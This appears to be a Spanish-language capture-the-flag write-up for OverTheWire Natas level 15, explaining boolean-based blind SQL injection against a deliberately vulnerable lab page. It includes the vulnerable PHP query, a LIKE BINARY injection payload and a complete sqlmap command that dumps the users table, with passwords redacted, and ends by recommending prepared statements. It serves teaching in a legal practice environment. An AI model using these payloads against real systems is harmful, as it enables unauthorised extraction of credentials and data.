# Natas Level 15 → Level 16

> ⚠️ Spoilers: las contraseñas están omitidas (`[redacted]`). Lo importante es el método.

- **URL:** `http://natas15.natas.labs.overthewire.org`
- **Credenciales:** `natas15` / `[redacted]`

## Análisis y Explotación
La aplicación solo tiene un campo de búsqueda de username y responde con dos mensajes posibles: `"This user exists."` o `"This user doesn't exist."` — nunca muestra datos de la DB directamente. El código:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
$res = mysqli_query($link, $query);
if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.";
    } else {
        echo "This user doesn't exist.";
    }
}
```

No hay output de datos — solo una respuesta booleana. Esto es **Blind SQL Injection**: la única información disponible es verdadero/falso.

### Concepto: Blind Boolean-based SQLi

La idea es hacer preguntas de sí/no sobre los datos: *"¿El primer carácter de la password de natas16 es 'a'?"*. Si el servidor responde `"This user exists."` → es verdadero. Se itera sobre todos los caracteres posibles hasta reconstruir la password completa.

El payload por carácter usa `LIKE BINARY` (case-sensitive):
```sql
natas16" AND password LIKE BINARY "a%"-- 
```

Esto transforma la query en:
```sql
SELECT * from users where username="natas16" AND password LIKE BINARY "a%"
```
- Si la password empieza con `a` → retorna fila → `"This user exists."` ✓
- Si no → no retorna filas → `"This user doesn't exist."` ✗

Se repite para cada posición: `a%`, `ab%`, `abc%`, etc., hasta tener los 32 caracteres.

### Herramienta: sqlmap con `--prefix` / `--suffix`

Como la inyección usa comillas dobles (no simples), sqlmap no la detecta con sus probes por defecto. Se deben especificar el prefijo y sufijo del punto de inyección:

```bash
sqlmap -u "http://natas15.natas.labs.overthewire.org/" \
  --data='username=natas16' \
  --auth-type=Basic \
  --auth-cred="natas15:[redacted]" \
  -p username \
  --technique=B \
  --dbms=mysql \
  --prefix='"' \
  --suffix='-- -' \
  --dump
```

- `--prefix='"'` → le dice a sqlmap que el punto de inyección cierra con una `"` antes del payload
- `--suffix='-- -'` → comenta el resto de la query
- `--technique=B` → solo boolean-based blind (el único disponible aquí)
- `--dump` → vuelca toda la tabla `users`

sqlmap identificó la inyección, enumeró la DB `natas15`, tabla `users`, y extrajo todas las filas:

```
Database: natas15
Table: users
[4 entries]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| [redacted]                       | bob      |
| [redacted]                       | charlie  |
| [redacted]                       | alice    |
| [redacted]                       | natas16  |
+----------------------------------+----------+
```

- **Password obtenida (`natas16`):** `[redacted]`

## Lección aprendida
Blind SQLi demuestra que incluso sin output de datos, una respuesta booleana es suficiente para exfiltrar información completa — solo toma más requests (como máximo 62 × 32 = 1984 con un charset alfanumérico de 62 caracteres y una password de 32). La defensa es idéntica a SQLi clásica: **prepared statements**. El hecho de que la app no muestre datos no la protege si la query es injectable.
